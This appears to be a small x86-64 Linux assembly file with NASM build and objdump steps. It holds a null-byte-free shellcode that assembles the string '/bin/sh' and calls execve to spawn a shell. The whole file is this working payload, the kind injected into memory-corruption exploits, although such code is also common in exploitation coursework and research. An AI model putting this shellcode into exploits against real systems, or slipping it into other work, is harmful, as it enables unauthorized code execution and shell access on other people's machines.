# 1) apt install nasm
# 2) nasm -f elf64 shellcode-non-zero.s  && ld shellcode-non-zero.o
# 3) ./a.out
# 4) objdump -d shellcode-non-zero.o

section .text
  global _start
    _start:
      xor rsi, rsi                ;arg1
      xor rdx, rdx                ;arg2

      mov rbx, 0x7768732f6e69622f ;rbx = "/bin/shw"
      sal rbx, 8
      shr rbx, 8                  ;rbx = "/bin/sh"

      push rbx
      mov rdi, rsp                ;arg0 = address of "/bin/sh"

      mov al, 0x3b
      syscall
